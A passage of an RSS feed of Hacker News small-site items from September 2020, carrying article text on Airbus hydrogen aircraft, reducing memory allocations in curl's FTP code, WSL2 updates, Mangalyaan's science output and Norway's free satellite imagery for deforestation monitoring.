            <guid isPermaLink="false">hacker-news-small-sites-24577233</guid>
            <pubDate>Thu, 24 Sep 2020 10:42:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Airbus to launch hydrogen-powered commercial aircraft by 2035]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577226">thread link</a>) | @artagnon
<br/>
September 24, 2020 | https://www.rfi.fr/en/france/20200921-airbus-to-launch-hydrogen-powered-commercial-aircraft-by-2035 | <a href="https://web.archive.org/web/*/https://www.rfi.fr/en/france/20200921-airbus-to-launch-hydrogen-powered-commercial-aircraft-by-2035">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
                    Airbus has announced its aim to put the world's first hydrogen-powered commercial aircraft into service by 2035.
                </p><div>
                    
                                        <p>"This is a historic moment for the commercial aviation sector as a whole and we intend to play a leading role in the most important transition this industry has ever seen,"&nbsp;Guillaume Faury, Airbus CEO said.</p><p>"The concepts we unveil today offer the world a glimpse of our ambition to drive a bold vision for the future of zero-emission flight."</p><p>Airbus‚Äô hydrogen technology will be demonstrated in three concept aircrafts called Zeroe: a turboprop (up to 100 passengers), a turbo fan (100 to 200 passengers) and a blended wing body (up to 200 passengers).</p><p>Speaking in a web telecast, Grazia Vittadini, chief technology officer of Airbus, explained the reason behind the choice of hydrogen for the zero emissions program.</p><p><strong>Hydrogen's flexibility</strong></p><p>‚ÄúHydrogen can be combusted directly through modified gas turbines. It can also be converted into electric energy thanks to fuel cells and when combined with CO2 hydrogen can be used to produce synthetic kerosene,‚Äù she said.</p><p>She added Airbus would&nbsp;focus on combining the first two elements.</p>                
    <p>‚ÄúThis means having direct combustion of hydrogen through modified gas turbines with an embedded electric motor powered by fuel cells.‚Äù</p><p>She also listed hydrogen‚Äôs other key advantage. ‚ÄúHydrogen has the same energy level as kerosene that enables it to deliver same kind of range and performance with one third of the weight.‚Äù</p><p>She remarked that the first flight demonstrator of a hydrogen aircraft is expected to be in 2025.</p><p>The French government has earmarked 1.5 billion euros for the development of carbon-free aircraft as part of a support plan for the aviation sector, with other European countries&nbsp;supporting the growth of &nbsp;hydrogen technology.</p>
                                            
    
                </div></div>]]>
            </description>
            <link>https://www.rfi.fr/en/france/20200921-airbus-to-launch-hydrogen-powered-commercial-aircraft-by-2035</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577226</guid>
            <pubDate>Thu, 24 Sep 2020 10:42:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reducing mallocs for fun]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577129">thread link</a>) | @headalgorithm
<br/>
September 24, 2020 | https://daniel.haxx.se/blog/2020/09/24/reducing-mallocs-for-fun/ | <a href="https://web.archive.org/web/*/https://daniel.haxx.se/blog/2020/09/24/reducing-mallocs-for-fun/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Everyone needs something fun to do in their spare time. And digging deep into curl internals is mighty fun!</p>



<p>One of the things I do in curl every now and then is to run a few typical command lines and count how much memory is allocated and how many memory allocation calls that are made. This is good project hygiene and is a basic check that we didn‚Äôt accidentally slip in a malloc/free sequence in the transfer path or something.</p>



<p>We have extensive memory checks for leaks etc in the test suite so I‚Äôm not worried about that. Those things we detect and fix immediately, even when the leaks occur in error paths ‚Äì thanks to our fancy ‚Äútorture tests‚Äù that do error injections.</p>



<p>The amount of memory needed or number of mallocs used is more of a <a href="https://en.wikipedia.org/wiki/Boiling_frog">boiling frog problem</a>. We add one now, then another months later and a third the following year. Each added malloc call is motivated within the scope of that particular change. But taken all together, does the pattern of memory use make sense? Can we make it better?</p>



<h2>How?</h2>



<p>Now this is easy because when we build curl debug enabled, we have a fancy logging system (we call it <em>memdebug</em>) that logs all calls to ‚Äúfallible‚Äù system functions so after the test is completed we can just easily grep for them and count. It also logs the exact source code and line number.</p>



<pre>cd tests
./runtests -n [number]
egrep -c 'alloc|strdup' log/memdump</pre>



<h2>Let‚Äôs start</h2>



<p>Let me start out with a look at the history and how many allocations (calloc, malloc, realloc or strdup) we do to complete test 103. The reason I picked 103 is somewhat random, but I wanted to look at FTP and this test happens to do an ‚Äúactive‚Äù transfer of content and makes a total of 10 FTP commands in the process.</p>



<p>The reason I decided to take a closer look at FTP this time is because I fixed an issue in the main ftp source code file the other day and that made me remember the <code>Curl_pp_send()</code> function we have. It is the function that sends FTP commands (and IMAP, SMTP and POP3 commands too, the family of protocols we refer to as the ‚Äúping pong protocols‚Äù internally because of their command-response nature and that‚Äôs why it has ‚Äúpp‚Äù in the name).</p>



<p>When I reviewed the function now with my malloc police hat on, I noticed how it made two calls to aprintf(). Our printf version that returns a freshly malloced area ‚Äì which can even cause several reallocs in the worst case. But this meant <em>at least </em>two mallocs per issued command. That‚Äôs a bit unnecessary, isn‚Äôt it?</p>



<h2>What about a few older versions</h2>



<p>I picked a few random older versions, checked them out from git, built them and counted the number of allocs they did for test 103:</p>



<pre>7.52.1: 141<br>7.68.0: 134<br>7.70.0: 137<br>7.72.0: 123</pre>



<p>It‚Äôs been up but it has gone down too. Nothing alarming, Is that a good amount or a bad amount? We shall see‚Ä¶</p>



<h2>Cleanup step one</h2>



<p>The function gets printf style arguments and sends them to the server. The sent command also needs to append CRLF to the data. It was easy to make sure the CRLF appending wouldn‚Äôt need an extra malloc. That was just sloppy of us to have there in the first place. Instead of mallocing the new printf format string with CRLF appended, it could use one in a stack based buffer. I landed that as a <a href="https://github.com/curl/curl/commit/0548ecaf6ac6fd8d81d63048d09ece8dbb715666">first commit</a>.</p>



<p>This trimmed off 10 mallocs for test 103.</p>



<h2>Step two, bump it up a notch</h2>



<p>The remaining malloc allocated the memory block for protocol content to send. It can be up to several kilobytes but is usually just a few bytes. It gets allocated in case it needs to be held on to if the entire thing cannot be sent off over the wire immediately. Remember, curl is non-blocking internally so it cannot just sit waiting for the data to get transferred.</p>



<p>I switched the malloc‚Äôed buffer to instead use a ‚Äòdynbuf‚Äô. That‚Äôs our internal ‚Äúdynamic buffer‚Äù system that was <a href="https://github.com/curl/curl/commit/ed35d6590e72c23c568af1e3b8ac6e4e2d883888#diff-8990ac09ce8abcb4f5e90a8f210ae11c">introduced earlier this year</a> and that we‚Äôre gradually switching all internals over to use instead of doing ‚Äúcustom‚Äù buffer management in various places. <a href="https://github.com/curl/curl/blob/master/docs/DYNBUF.md">The internal API for dynbuf is documented here</a>.</p>



<p>The internal API <code>Curl_dyn_addf()</code> adds a printf()-style string at the end of a ‚Äúdynbuf‚Äù, and it seemed perfectly suitable to use here. I only needed to provide a <code>vprintf()</code> alternative since the printf() format was already received by <code>Curl_pp_sendf()</code>‚Ä¶ I created <code>Curl_dyn_vaddf()</code> for this.</p>



<p>This single dynbuf is kept for the entire transfer so that it can be reused for subsequent commands and grow only if needed. Usually the initial 32 bytes malloc should be sufficient for all commands.</p>



<h2>Not good enough</h2>



<p>It didn‚Äôt help!</p>



<p>Counting the mallocs showed me with brutal clarity that my job wasn‚Äôt done there. Having dug this deep already I wasn‚Äôt ready to give this up just yet‚Ä¶</p>



<p>Why? Because <code>Curl_dyn_addf()</code> was still doing a separate alloc of the printf string that it then appended to the dynamic buffer. But okay, having <a href="https://github.com/curl/curl/blob/master/lib/mprintf.c">our own printf() implementation</a> in the code has its perks.</p>



<h2>Add a printf() string without extra malloc</h2>



<p>Back in <a href="https://github.com/curl/curl/commit/ed35d6590e72c23c568af1e3b8ac6e4e2d883888#diff-8990ac09ce8abcb4f5e90a8f210ae11c">May 2020</a> when I introduced this dynbuf thing, I converted the aprintf() code over to use dynbuf to truly unify our use of dynamically growing buffers. That was a main point with it after all.</p>



<p>As all the separate individual pieces I needed for this next step were already there, all I had to do was to add a new entry point to the printf() code that would accept a dynbuf as input and write directly into that (and grow it if needed), and then use that new function (<code>Curl_dyn_vprintf</code>) from the Curl_dyn_addf().</p>



<p>Phew. Now let‚Äôs see what we get‚Ä¶</p>



<p>There are 10 FTP commands that previously did 2 mallocs each: 20 mallocs were spent  in this function when test 103 was executed. Now we are down to the ideal case of one alloc in there for the entire transfer.</p>



<h2>Test 103 after polish</h2>



<p>The code right now in master (to eventually get released as 7.73.0 in a few weeks), now shows <strong>a total of 104 allocations</strong>. Down from 123 in the previous release, which not entirely surprising is 19 fewer and thus perfectly matching the logic above.</p>



<p>All tests and CI ran fine. <a href="https://github.com/curl/curl/commit/675eeb1c941706070381faaad8ee1a5d75cff4a4">I merged it</a>. This is a change that benefits all transfers done with any of the ‚Äúping pong protocols‚Äù. And it also makes the code easier to understand!</p>



<p>Compared to curl 7.52.1, this is a 26% reduction in number of allocation; pretty good, but even compared to 7.72.0 it is still a 15% reduction.</p>



<h2>More?</h2>



<p>There is always more to do, but there‚Äôs also a question of diminishing returns. I will continue to look at curl‚Äôs memory use going forward too and make sure everything is motivated and reasonable. At least every once in a while.</p>



<p>I have some additional ideas for further improvements in the memory use area to look into. We‚Äôll see if they pan out‚Ä¶</p>



<p>Don‚Äôt count on me to blog about every such finding with this level of detail! If you want to make sure you don‚Äôt miss any of these fine-tunes in the future, follow <a href="https://github.com/curl/curl">the curl github repo</a>.</p>



<h2>Credits</h2>



<p>Image by <a href="https://pixabay.com/users/orzalaga-77630/?utm_source=link-attribution&amp;utm_medium=referral&amp;utm_campaign=image&amp;utm_content=1837434">Julio C√©sar Vel√°squez Mej√≠a</a> from <a href="https://pixabay.com/?utm_source=link-attribution&amp;utm_medium=referral&amp;utm_campaign=image&amp;utm_content=1837434">Pixabay</a></p>
	</div></div>]]>
            </description>
            <link>https://daniel.haxx.se/blog/2020/09/24/reducing-mallocs-for-fun/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577129</guid>
            <pubDate>Thu, 24 Sep 2020 10:22:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Microsoft Windows 10 WSL2 to have GUI app support, automatic Linux Kernel update]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577045">thread link</a>) | @vvpvijay
<br/>
September 24, 2020 | https://androidrookies.com/microsoft-windows-10-wsl2-update-comes-with-gui-app-support-automatic-linux-kernel-update/ | <a href="https://web.archive.org/web/*/https://androidrookies.com/microsoft-windows-10-wsl2-update-comes-with-gui-app-support-automatic-linux-kernel-update/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-11055"><div><div><div><h2>You can soon run Windows Subsystem for Linux 2 on your Windows 10 1903 and 1909 version; WSL 2 update to bring Linux GUI App support and automatic Linux Kernel update</h2><p>In your next Windows 10 update, you can run any Linux apps in WSL2 in their own dedicated UI thus making you feel you are on a Linux laptop. This is not all, Microsoft will be pushing WSL 2 to Windows 10 1903 and 1909 version laptops, PCs, and servers. This means that all Windows 10 users irrespective of their version will be able to run WSL2 on their laptops, PCs, and servers.</p><p>These are some of the announcements <a href="https://devblogs.microsoft.com/commandline/whats-new-in-the-windows-subsystem-for-linux-september-2020/">Microsoft</a> has made to make Windows Subsystem for Linux 2 a very important subset of Windows 10 operating system. Microsoft had originally announced many features in WSL 2 during the Build developer conference earlier this year.</p><p>Microsoft blog says that now WSL 2 will be available for all Windows 10 versions. The WSL 2 was first released through the May 2020 Windows update called Windows 10 version 2004. Now WSL 2 will be available for Windows 10 version 1903 and 1909 in the coming weeks.</p><p>‚ÄúWe‚Äôve heard feedback on how many users have enjoyed using WSL 2 and have made WSL 2 available to more Windows users with this backport. Customers running Windows 10 version 1903 and 1909 can now enjoy faster file system performance, 100% system call compatibility, and be able to use Docker Desktop with the WSL2-based engine,‚Äù Craig Loewen, Program Manager, Windows Developer Platform, explains.</p><p>In the Build conference, Microsoft had also announced native GUI app support for WSL2. Loewen says that this feature will now be released through an update to all Windows 10 users. After the update, you will be&nbsp;able to run Linux apps in WSL2 in their own dedicated UI. This will give users the feel of actually being on a Linux run PC or laptop.</p><p>‚ÄúWSL will support many different types of applications, including IDEs running fully in a Linux environment. We have included lots of fit and finish details, such as showing the icons for Linux apps in the taskbar and support for audio with your microphone,‚Äù Loewen notes.</p><p>Another feature coming through a Windows 10 update is support for the wsl ‚Äìinstall command in WSL2. This feature was also announced at the Build developer conference this year and allows Windows 10 users to fully install WSL2 and Linux distro of their choice using the SUDO command.</p><p>Another big change coming to Windows 10 WSL 2 is automatic Linux Kernel update. Once update with the new patches, Windows 10 users will no longer concerned about updating Linux Kernel to keep up with Linux Foundation‚Äôs security fixes. This feature which was announced in the Microsoft Build conference will now be live for everybody, so in the future Linux kernel versions will be updated automatically just like the Windows operating system in the first place.</p><p>‚ÄúYou can have greater control over your Linux kernel version, as well as your Windows version, enabling you to stay safe and secure as Windows keeps you up to date. The new kernel versions are no longer only for Windows Insiders, now any device that has WSL enabled and has opted into Microsoft Updates will automatically receive the latest kernel version!‚Äù Loewen continues.</p><p>Loewen says that the above features will be released to Windows 10 users in a phased manner. So keep updating your Windows 10 to get the latest WSL 2 features from Microsoft.</p></div></div></div></article></div>]]>
            </description>
            <link>https://androidrookies.com/microsoft-windows-10-wsl2-update-comes-with-gui-app-support-automatic-linux-kernel-update/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577045</guid>
            <pubDate>Thu, 24 Sep 2020 10:06:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[India‚Äôs Mars orbiter completes 6 years at the red planet. Where is the science?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24576962">thread link</a>) | @uncertainquark
<br/>
September 24, 2020 | https://jatan.space/missing-science-from-mangalyaan/ | <a href="https://web.archive.org/web/*/https://jatan.space/missing-science-from-mangalyaan/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div><figure><img loading="lazy" width="817" height="543" src="https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-cover.jpg?resize=817%2C543&amp;ssl=1" alt="" srcset="https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-cover.jpg?w=817&amp;ssl=1 817w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-cover.jpg?resize=200%2C133&amp;ssl=1 200w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-cover.jpg?resize=768%2C510&amp;ssl=1 768w" sizes="(max-width: 817px) 100vw, 817px" data-recalc-dims="1"><figcaption>Artist‚Äôs impression of the Mangalyaan spacecraft. Credit: ISRO</figcaption></figure></div>



<p>This September 24 marks six years since ISRO‚Äôs Mangalyaan spacecraft entered Mars orbit, making India the first Asian country to do so. What is even more impressive is that Mangalyaan was the country‚Äôs first interplanetary mission. Combined with the cost effectiveness for which it is lauded, Mangalyaan is often hailed as India‚Äôs most successful space mission. But is it?</p>



<h3><strong>Mangalyaan‚Äôs missing Science</strong></h3>



<p>The Indian Prime Minister, Narendra Modi, has <a href="https://www.hindustantimes.com/india/modi-steals-the-show-with-mom-speech/story-InpN3lWUPODF6OURjabTgJ.html">boasted</a> that at ~$70 million, the mission was cheaper than the Hollywood film <em>Gravity</em>, and even an <em>auto rickshaw</em> (taxi-equivalent) ride on a fare-per-kilometer basis. The media highlighted Mangalyaan‚Äôs cost effectiveness too, noting that NASA‚Äôs MAVEN orbiter to Mars, launched around the same time, had cost about seven times more.</p>



<p>India‚Äôs pride in the mission while downplaying others has continued to spread over the years, also taking the form of dramatized movies like <a href="https://www.imdb.com/title/tt9248972/">Mission Mangal</a>. But what they all miss is looking at the science output i.e. what has Mangalyaan been doing in Mars orbit?</p>



<p>According to ISRO‚Äôs official <a href="https://www.isro.gov.in/sites/default/files/mom-list-of-publications-sept2019.pdf">list of publications</a>, there have been only 27 peer-reviewed papers relating to Mangalyaan, after six years in orbit. In contrast, MAVEN has helped produce many <a href="https://jatan.space/nasa-maven-mars-orbiter/">seminal scientific results</a> about the martian atmosphere, with a repository of <a href="https://ui.adsabs.harvard.edu/search/q=((MAVEN%20spacecraft)%20AND%20year%3A2012-2021)%20full%3A%22mars%22&amp;sort=date%20desc%2C%20bibcode%20desc&amp;p_=0">at least 500</a> papers and growing. What‚Äôs more concerning about Mangalyaan‚Äôs short publications list is that about half of those are simply engineering descriptions of the mission, not scientific results <em>from</em> the mission.</p>



<p>Naysayers may dismiss the lack of science by arguing that Mangalyaan was a ‚Äòtechnology demonstration‚Äô mission, aimed at proving ISRO‚Äôs interplanetary mission capabilities. That may be part of it but that‚Äôs not how ISRO marketed the mission pre and post launch, when it was vocal about the science goals.</p>



<p>ISRO has made data from Mangalyaan‚Äôs five indigenous <a href="https://www.isro.gov.in/announcement-of-opportunity-utilising-mars-orbiter-mission-data-mcc-tis-msm-lap-and-menca-payloads-1">science instruments</a> available on their <a href="https://mrbrowse.issdc.gov.in/MOMLTA/">data portal</a> for five years now, and has <a href="https://www.isro.gov.in/pslv-c25-mars-orbiter-mission/announcement-of-opportunity-utilising-mars-orbiter-mission-data-mcc">explicitly welcomed</a> the Indian science community to publish papers. In 2017, ISRO <a href="https://www.isro.gov.in/mom-science-meet">announced</a> at the mission‚Äôs dedicated science meet that 32 research teams across the country are exploring and analyzing Mangalyaan data. And yet, there is a huge vacuum of publications.</p>







<p>Perhaps the most notable failure concerns the much-hyped methane sensor. The instrument was supposed to globally map methane with a sensitivity of parts per billion, to help decide if the methane on Mars could be a sign of subsurface life. But two years after launch, the instrument was found to <a href="https://www.seeker.com/india-mars-orbiter-mission-methane-detector-flaw-red-planet-2133861312.html">have a design flaw</a> and so it can‚Äôt detect methane at all. At that point, ISRO repurposed the methane sensor as an albedo mapper, which measures sunlight reflected from the surface to get hints about Mars‚Äô surface composition.</p>



<p>There also seem to be no published results from the Lyman Alpha Photometer. By looking for hydrogen escaping Mars‚Äô atmosphere, it was supposed to tell us how much water Mars lost since its birth and at what rate. Notably, NASA‚Äôs MAVEN spacecraft was also expected to deliver this result (by examining many more factors), and <a href="https://jatan.space/nasa-maven-mars-orbiter/">it delivered</a>.</p>



<h3><strong>The urge to be first</strong></h3>



<p>If the cost argument is to be made to justify some or any part of the missing science, ISRO‚Äôs own Chandrayaan 1 refutes it. At $54 million, it was cost effective too, and an equally challenging endeavor given that it was India‚Äôs first lunar orbiter.</p>



<p>Unlike Mangalyaan though, Chandrayaan 1 welcomed global collaboration ‚Äì&nbsp;about half the instruments came from foreign space agencies and universities. Notably, it was the two NASA instruments that confirmed the <a href="https://jatan.space/how-nasa-and-chandrayaan-discovered-water-on-the-moon/">discovery of water on the Moon</a>. Despite orbiting the Moon for less than a year, Chandrayaan 1 produced hundreds of publications and scientists are analyzing its data even today.</p>



<p>This is not to say that ISRO can‚Äôt build good science instruments but to point out that collaboration can be an effective way to increase mission science without increasing mission cost. For some reason, ISRO doesn‚Äôt even fly science instruments from universities and institutions within the country for its planetary missions. The only exception has been India‚Äôs first space telescope Astrosat whose instruments were selected as a consensus from academic institutions across the country. But that‚Äôs not planetary exploration per se, for which ISRO operates differently. ISRO does <a href="https://jatan.space/isro-welcomes-academia-companies-in-space-exploration-plans/">intend to change this method in the future</a> as part of its space commercialization initiative by involving private players and academic institutions.</p>



<p>Both the missing collaborations and lack of scientific output from Mangalyaan‚Äôs indigenous instruments may have to do with the mission‚Äôs development time, which was just 18 months. It‚Äôs unclear why ISRO was in such a hurry to launch in 2013 and couldn‚Äôt have targeted the 2016 launch opportunity instead. The reason may be political ‚Äì&nbsp;the urge to successfully orbit Mars before China or Japan does.</p>



<div><figure><img loading="lazy" width="1024" height="723" src="https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-launch.jpg?resize=1024%2C723&amp;ssl=1" alt="" srcset="https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-launch.jpg?resize=1024%2C723&amp;ssl=1 1024w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-launch.jpg?resize=200%2C141&amp;ssl=1 200w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-launch.jpg?resize=768%2C543&amp;ssl=1 768w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-launch.jpg?resize=1536%2C1085&amp;ssl=1 1536w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-launch.jpg?resize=1200%2C848&amp;ssl=1 1200w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-launch.jpg?w=1594&amp;ssl=1 1594w" sizes="(max-width: 1024px) 100vw, 1024px" data-recalc-dims="1"><figcaption>Launch of Mangalyaan onboard a PSLV rocket on November 5, 2013. <a href="https://www.isro.gov.in/pslv-c25-mars-orbiter-mission/pslv-c25-mars-orbiter-mission-gallery">Credit: ISRO</a></figcaption></figure></div>



<p>Had Mangalyaan been given enough time, the scientific instruments package likely wouldn‚Äôt have been restricted to the mere 15 kilograms, and the output could‚Äôve been substantial even with indigenous instruments. Case in point being ISRO‚Äôs Chandrayaan 2 orbiter which carries state-of-the-art instruments, all indigenous, and is <a href="https://jatan.space/chandrayaan-2-is-creating-the-highest-resolution-map-of-the-moon/">making the highest-resolution map</a> of the Moon and quantifying water on its poles as we speak.</p>



<p>Another way Mangalyaan‚Äôs value could‚Äôve been improved was if ISRO equipped it with a standard relay device, one that every NASA Mars orbiter carries. These orbiter relays allow NASA to get more science data from its surface missions than would be possible otherwise. The European Space Agency <a href="https://mars.nasa.gov/news/nasa-radio-delivered-for-europes-2016-mars-orbiter/">put one such device</a> for NASA on their Trace Gas Orbiter, launched in 2016. If ISRO had done that too, instead of <a href="https://twitter.com/MarsOrbiter/status/514618412417302528">talking to NASA‚Äôs Curiosity on Twitter</a>, Mangalyaan could‚Äôve talked to the real deal.</p>



<h3><strong>Missing space exploration roadmap</strong></h3>



<p>More than the quality of the science instruments or mission planning, Mangalyaan highlights the lack of an overarching philosophy guiding India‚Äôs planetary missions.<strong> </strong>In contrast, NASA has an elaborate process called <a href="https://www.nationalacademies.org/our-work/planetary-science-and-astrobiology-decadal-survey-2023-2032">the Decadal Survey</a> in which scientists from across the US present a consensus of prioritized space exploration destinations and scientific objectives once every decade. NASA uses the Decadal as a guide to build its missions, and the system therefore guarantees that said scientific goals are achieved more often than not. China and the European Space Agency have similar processes in place for their missions.</p>



<p>Space exploration missions are inherently costly undertakings, and at this point, the value per unit money matters as much as the absolute cost, if not more. MAVEN highlights this adequately. The mission, part of NASA‚Äôs larger Mars exploration program, is built with the express purpose of studying Mars‚Äô atmosphere and determining exactly how the red planet lost its water. Thanks to its clear objectives, MAVEN delivered big science&nbsp;while still costing NASA less than many of its other endeavors, even if costing more than Mangalyaan.</p>



<p>Like NASA‚Äôs other missions, MAVEN‚Äôs findings feed directly into the agency‚Äôs next steps in Mars exploration and planning of future habitats, further cementing the value-proposition of such a model. India could benefit immensely from a formal planetary exploration framework which either doesn‚Äôt exist or whose functioning is inept and unclear to the public.</p>



<p>ISRO plans to launch Mangalyaan 2 in 2024 with an upgraded orbiter, with a capacity of 100 kilograms for scientific instruments. The mission could also include a lander and a rover but it seems unlikely at the moment. Notably, Mangalyaan 2 will launch after the first Mars rover missions from China and the European Space Agency, and alongside NASA‚Äôs ever present Mars fleet. Let us hope Mangalyaan 2 is an appropriate step forward in this journey.</p>



<div><figure><img loading="lazy" width="1200" height="1200" src="https://i0.wp.com/jatan.space/wp-content/uploads/2020/09/mars-globe-view-mom.jpg?resize=1200%2C1200&amp;ssl=1" alt="" srcset="https://i0.wp.com/jatan.space/wp-content/uploads/2020/09/mars-globe-view-mom.jpg?w=2048&amp;ssl=1 2048w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/09/mars-globe-view-mom.jpg?resize=1024%2C1024&amp;ssl=1 1024w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/09/mars-globe-view-mom.jpg?resize=200%2C200&amp;ssl=1 200w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/09/mars-globe-view-mom.jpg?resize=768%2C768&amp;ssl=1 768w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/09/mars-globe-view-mom.jpg?resize=1536%2C1536&amp;ssl=1 1536w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/09/mars-globe-view-mom.jpg?resize=1200%2C1200&amp;ssl=1 1200w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/09/mars-globe-view-mom.jpg?resize=800%2C800&amp;ssl=1 800w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/09/mars-globe-view-mom.jpg?resize=400%2C400&amp;ssl=1 400w" sizes="(max-width: 1200px) 100vw, 1200px" data-recalc-dims="1"><figcaption>Global view of Mars from the Mangalyaan spacecraft, taken on October 4, 2014, from an altitude of 76,680 kilometers.<em>&nbsp;</em>Credit: ISRO / Emily Lakdawalla, released under <a href="https://creativecommons.org/licenses/by-nc-nd/3.0/">CC BY-NC-ND 3.0</a>.</figcaption></figure></div>



<blockquote><p>I could write this article because of the support of my readers on <a href="https://www.patreon.com/uncertainquark">Patreon</a>. I don‚Äôt display ads on my blog so if you like my work, consider&nbsp;<a href="https://www.patreon.com/uncertainquark">supporting me</a> and get benefits in return.&nbsp;üöÄ</p></blockquote>



<hr>



<p><em><a href="https://science.thewire.in/space/isros-mangalyaan-orbiter-completes-six-years-around-mars-wheres-the-science/">Republished</a> by The Wire Science.</em></p>



<pre>On a related note, I was invited as a guest on the NewSpace India podcast led by <a href="https://twitter.com/cosmosguru/">Narayan Prasad</a>, a space entrepreneur and industry expert, to <a href="https://share.transistor.fm/s/b5cea33e">talk about Mangalyaan and India's space exploration missions</a>.</pre>

</div></div>]]>
            </description>
            <link>https://jatan.space/missing-science-from-mangalyaan/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24576962</guid>
            <pubDate>Thu, 24 Sep 2020 09:50:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[New satellite images to allow anyone to monitor tropical deforestation]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24576847">thread link</a>) | @dcustodio
<br/>
September 24, 2020 | https://www.nicfi.no/current/new-satellite-images-to-allow-anyone-anywhere-to-monitor-tropical-deforestation/ | <a href="https://web.archive.org/web/*/https://www.nicfi.no/current/new-satellite-images-to-allow-anyone-anywhere-to-monitor-tropical-deforestation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>‚ÄúThis will revolutionize global forest monitoring. Better insight into what is happening in the rainforests will enhance efforts to protect these priceless ecosystems‚Äù, says Sveinung Rotevatn, Norway‚Äôs Minister of Climate and Environment.</p>

<h2><strong>Better information saves rainforests</strong></h2>
<p>Satellite images are available that are so detailed that one can see if a single tree has been cut down. However, such images are very expensive, and only a few private stakeholders have access to them. Through <a href="https://www.nicfi.no/">Norway‚Äôs International Climate and Forest Initiative (NICFI)</a>, the Government of Norway is now making the images accessible and free for everyone.</p>
<p>The high-resolution satellite images provide an overview of all the tropical forests around the world, and these images will be updated every month. Users can access image archives that include data dating back to 2015. This allows users to see the development that has taken place in the forests over several years.</p>
<p>‚ÄúSmall communities can now be seen and heard in their struggle with companies that steal their rightful territories. The world‚Äôs supermarkets can monitor claims made by their suppliers regarding the sustainable production of soy, palm oil and other raw materials‚Äù, says Rotevatn.</p>
<p><em>&nbsp;</em>The images will be free of charge. Anyone around the world can detect deforestation occurring in very small areas, whether it be authorities, companies buying raw materials associated with deforestation, investors, journalists, scientists, indigenous organizations or NGOs.</p>
<h2><strong>Powerful tool for indigenous people.</strong></h2>
<p>Not least, information from satellite images is important for indigenous organizations. The indigenous leader Ianukul√° Kaiabi Sui√°, from the <em>Associa√ß√£o Terra Ind√≠gena do Xingu</em> (ATIX), has high expectations for the new satellite images. He represents the indigenous territory of S√£o F√©lix do Xingu in Brazil, one of the most vulnerable areas in the Amazon.</p>
<p>‚ÄúSatellite image is a powerful tool since it is better understood by indigenous communities compared to data sources from numbers. These images will give the communities a better understanding of the problems‚Äô location and dimension, so that their actions can be better planned‚Äù, says Ianukul√° Kaiabi Sui√°</p>
<p>Colombia‚Äôs Minister of the Environment and Sustainable Development, Ricardo Jos√© Lozano Pic√≥n, points out that Colombia over the last years has developed an advanced monitoring system, but that a bottleneck has been that high-resolution satellite images are very expensive.</p>
<p>‚ÄúWith Norway‚Äôs new investment in free available, high resolution satellite imagery, Colombia will continue to get access to frequent and detailed satellite observations. This will improve the monitoring and management of our valuable forests‚Äù, says Lozano.</p>

<h2><strong>Technology is saving rainforests.<br>
</strong></h2>
<p><a href="http://www.nicfi.no/">Norway‚Äôs International Climate and Forest Initiative (NICFI)</a> has supported satellite-based rainforest monitoring for many years, including through a collaboration with <em>Google </em>and the <em>World Resources Institute </em>called <a href="https://www.globalforestwatch.org/">Global Forest Watch</a>. This project uses satellite data to detect forest changes.</p>
<p>Norway also supports <a href="http://sepal.io/">SEPAL</a>, an analysis tool&nbsp; developed by the <a href="http://www.fao.org/home/en/">Food and Agriculture Organization of the United Nations‚Äù</a>, that helps forested countries gain an overview of deforestation and land use. Both services will be strengthened by this procurement.</p>
<p>‚ÄúWe have already made important progress in providing open and accessible information about where and why deforestation is occurring. This technology is used by journalists, organizations and individuals around the world, and helps save important forests and nature. Now we are taking it one step further. The fight to combat deforestation and forest crime is more important than ever before‚Äù, says Rotevatn.</p>
<p>Norway pays several tropical forest countries, including Indonesia and Colombia, to reduce emissions caused by deforestation. Better images reduce the uncertainties associated with the estimates.</p>

<h2><strong>Comprehensive competitive procurement.</strong></h2>
